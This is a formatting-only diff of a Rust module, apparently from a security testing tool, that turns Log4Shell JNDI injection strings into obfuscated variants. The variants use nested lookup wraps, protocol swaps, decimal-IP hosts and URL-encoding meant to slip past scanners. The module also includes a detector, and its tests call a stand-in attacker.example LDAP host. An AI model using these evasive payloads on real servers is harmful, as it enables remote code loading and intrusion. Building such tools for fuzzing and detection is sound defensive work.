@@ -62,9 +62,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
     // Strip the outer `${…}` wrapper to get the inner `jndi:proto://host/path`
     // expression. We work with the inner string to compose obfuscations.
     let trimmed = payload.trim();
-    let inner_opt = trimmed
-        .strip_prefix("${")
-        .and_then(|s| s.strip_suffix('}'));
+    let inner_opt = trimmed.strip_prefix("${").and_then(|s| s.strip_suffix('}'));
     let inner = match inner_opt {
         Some(i) => i.trim(),
         None => return out,
@@ -98,26 +96,17 @@ pub fn mutate(payload: &str) -> Vec<String> {
     // contiguous substring of the output reads `jndi`. Three forms:
 
     // ${lower:x} — passthrough (lower:j = j, so this works for j,n,d,i)
-    let lower_wrap: String = "jndi"
-        .chars()
-        .map(|c| format!("${{lower:{c}}}"))
-        .collect();
+    let lower_wrap: String = "jndi".chars().map(|c| format!("${{lower:{c}}}")).collect();
     push(format!("${{{lower_wrap}:{proto_host}}}"));
 
     // ${upper:x} — same principle; result is uppercase letters but log4j
     // resolves case-insensitively for the `jndi` lookup prefix.
-    let upper_wrap: String = "jndi"
-        .chars()
-        .map(|c| format!("${{upper:{c}}}"))
-        .collect();
+    let upper_wrap: String = "jndi".chars().map(|c| format!("${{upper:{c}}}")).collect();
     push(format!("${{{upper_wrap}:{proto_host}}}"));
 
     // ${::-x} default-value trick — `${::-j}` has empty variable name so
     // always resolves to the default value `j`.
-    let default_wrap: String = "jndi"
-        .chars()
-        .map(|c| format!("${{::-{c}}}"))
-        .collect();
+    let default_wrap: String = "jndi".chars().map(|c| format!("${{::-{c}}}")).collect();
     push(format!("${{{default_wrap}:{proto_host}}}"));
 
     // ── 2. env: variable default substitution ────────────────────────
@@ -128,19 +117,13 @@ pub fn mutate(payload: &str) -> Vec<String> {
     push(format!("${{{env_wrap}:{proto_host}}}"));
 
     // ── 3. sys: property default substitution ────────────────────────
-    let sys_wrap: String = "jndi"
-        .chars()
-        .map(|c| format!("${{sys:x:-{c}}}"))
-        .collect();
+    let sys_wrap: String = "jndi".chars().map(|c| format!("${{sys:x:-{c}}}")).collect();
     push(format!("${{{sys_wrap}:{proto_host}}}"));
 
     // ── 4. date: literal character injection ─────────────────────────
     // Log4j's date pattern parser treats single-quoted strings as
     // literals: `${date:'j'}` resolves to the character `j`.
-    let date_wrap: String = "jndi"
-        .chars()
-        .map(|c| format!("${{date:'{c}'}}"))
-        .collect();
+    let date_wrap: String = "jndi".chars().map(|c| format!("${{date:'{c}'}}")).collect();
     push(format!("${{{date_wrap}:{proto_host}}}"));
 
     // ── 5. Protocol swap ─────────────────────────────────────────────
@@ -187,11 +170,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
 /// Only fires when the host is a dotted-quad IPv4 address or `localhost`.
 /// For domain names we leave it as-is (domain obfuscation is DNS-level, not
 /// our concern here — we'd need DNS resolution to build equivalents).
-fn push_host_obfuscations(
-    host_path: &str,
-    proto: &str,
-    push: &mut impl FnMut(String),
-) {
+fn push_host_obfuscations(host_path: &str, proto: &str, push: &mut impl FnMut(String)) {
     // Extract just the host (everything before first `/`)
     let host = host_path.split('/').next().unwrap_or(host_path);
     let path_suffix = &host_path[host.len()..]; // "" or "/…"
@@ -235,9 +214,7 @@ fn push_host_obfuscations(
 /// the `$` or `{` breaks that scan while leaving the log4j parser functional.
 #[must_use]
 fn obfuscate_dollars(payload: &str) -> String {
-    payload
-        .replace("${", "%24%7B")
-        .replace('}', "%7D")
+    payload.replace("${", "%24%7B").replace('}', "%7D")
 }
 
 /// Detect whether the payload is a JNDI injection expression.
@@ -265,8 +242,10 @@ pub fn detect_type(payload: &str) -> bool {
     if lower.starts_with("${") && lower.ends_with('}') {
         let inner = &lower[2..lower.len() - 1];
         // Inner contains a lookup wrapper before `ndi:` — this is a split-jndi form.
-        if (inner.contains("lower:j") || inner.contains("upper:j")
-            || inner.contains("::-j") || inner.contains("env:") && inner.contains(":-j")
+        if (inner.contains("lower:j")
+            || inner.contains("upper:j")
+            || inner.contains("::-j")
+            || inner.contains("env:") && inner.contains(":-j")
             || inner.contains("sys:") && inner.contains(":-j")
             || inner.contains("date:'j'"))
             && inner.contains("ndi:")
@@ -301,23 +280,17 @@ mod tests {
 
     #[test]
     fn detect_obfuscated_lower() {
-        assert!(detect_type(
-            "${${lower:j}ndi:ldap://attacker.example/a}"
-        ));
+        assert!(detect_type("${${lower:j}ndi:ldap://attacker.example/a}"));
     }
 
     #[test]
     fn detect_obfuscated_upper() {
-        assert!(detect_type(
-            "${${upper:j}ndi:ldap://attacker.example/a}"
-        ));
+        assert!(detect_type("${${upper:j}ndi:ldap://attacker.example/a}"));
     }
 
     #[test]
     fn detect_obfuscated_default() {
-        assert!(detect_type(
-            "${${::-j}ndi:ldap://attacker.example/a}"
-        ));
+        assert!(detect_type("${${::-j}ndi:ldap://attacker.example/a}"));
     }
 
     #[test]
@@ -360,10 +333,7 @@ mod tests {
     fn mutate_produces_lower_wrap_variant() {
         let muts = mutate("${jndi:ldap://attacker.example/a}");
         let has_lower = muts.iter().any(|m| m.contains("${lower:j}"));
-        assert!(
-            has_lower,
-            "must produce lower-wrap variant: {muts:?}"
-        );
+        assert!(has_lower, "must produce lower-wrap variant: {muts:?}");
     }
 
     #[test]
@@ -445,10 +415,7 @@ mod tests {
         let muts = mutate("${jndi:ldap://192.168.1.1/a}");
         // 192.168.1.1 = (192 << 24) | (168 << 16) | (1 << 8) | 1 = 3232235777
         let has_decimal = muts.iter().any(|m| m.contains("3232235777"));
-        assert!(
-            has_decimal,
-            "dotted-quad must produce decimal IP: {muts:?}"
-        );
+        assert!(has_decimal, "dotted-quad must produce decimal IP: {muts:?}");
     }
 
     #[test]
